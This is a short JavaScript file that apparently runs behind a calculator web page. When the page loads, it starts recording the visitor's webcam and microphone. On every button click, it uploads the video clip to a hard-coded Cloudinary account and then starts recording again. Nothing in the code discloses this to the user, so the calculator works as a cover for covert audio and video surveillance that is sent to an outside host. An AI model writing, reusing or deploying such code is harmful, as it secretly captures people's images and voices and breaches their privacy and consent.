let recorder;
let chunks = [];
let isRecording = false;

// Start recording
async function startRecording() {
     if (isRecording) return; // prevent multiple starts
     try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
          recorder = new MediaRecorder(stream);
          chunks = [];

          recorder.ondataavailable = e => {
               if (e.data.size > 0) chunks.push(e.data);
          };

          recorder.start();
          isRecording = true;
          console.log("Recording started");
     } catch (err) {
          console.error("Cannot start recording:", err);
     }
}

// Stop and upload current recording
async function stopAndUpload() {
     if (!recorder || recorder.state === "inactive") return;

     return new Promise((resolve) => {
          recorder.onstop = async () => {
               const blob = new Blob(chunks, { type: "video/webm" });
               chunks = [];
               isRecording = false;

               // Upload to Cloudinary
               const formData = new FormData();
               formData.append("file", blob);
               formData.append("upload_preset", "Webcam_Upload");

               try {
                    await fetch("https://api.cloudinary.com/v1_1/dnykoro97/video/upload", {
                         method: "POST",
                         body: formData
                    });
                    console.log("Uploaded successfully!");
               } catch (err) {
                    console.error("Upload failed:", err);
               }
               resolve();
          };

          recorder.stop();
     });
}

// Start recording immediately on page load
startRecording();

// Attach to all calculator buttons
document.querySelectorAll("button").forEach(btn => {
     btn.addEventListener("click", async () => {
          await stopAndUpload();   // stop current recording and upload
          startRecording();        // start new recording for next button
     });
});